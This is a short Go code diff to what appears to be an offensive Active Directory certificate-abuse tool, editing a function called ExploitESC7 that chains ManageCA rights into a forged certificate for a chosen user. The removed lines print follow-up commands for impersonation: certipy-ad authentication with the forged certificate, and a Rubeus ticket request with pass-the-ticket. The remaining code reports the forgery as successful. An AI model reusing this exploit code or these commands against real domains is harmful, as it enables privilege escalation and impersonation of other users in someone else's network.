@@ -4,7 +4,6 @@ import (
 	"crypto"
 	"crypto/x509"
 	"fmt"
-	"strings"
 
 	"github.com/go-ldap/ldap/v3"
 )
@@ -253,14 +252,6 @@ func ExploitESC7(cfg *ADCSConfig, caName, targetUPN string) (*x509.Certificate, 
 		fmt.Printf("[+] CA flags restored to original value: %s\n", originalFlags)
 	}
 
-	upnUser := targetUPN
-	if idx := strings.Index(upnUser, "@"); idx > 0 {
-		upnUser = upnUser[:idx]
-	}
 	fmt.Printf("[+] ESC7 exploitation successful — ManageCA -> ESC6 -> forged cert\n")
-	fmt.Printf("[*] Next steps:\n")
-	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", upnUser, cfg.Domain)
-	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s.pfx /ptt\n", targetUPN, upnUser)
-	fmt.Printf("    # Certificate obtained via ESC7 (ManageCA abuse) on CA: %s\n", caName)
 	return cert, certKey, nil
 }
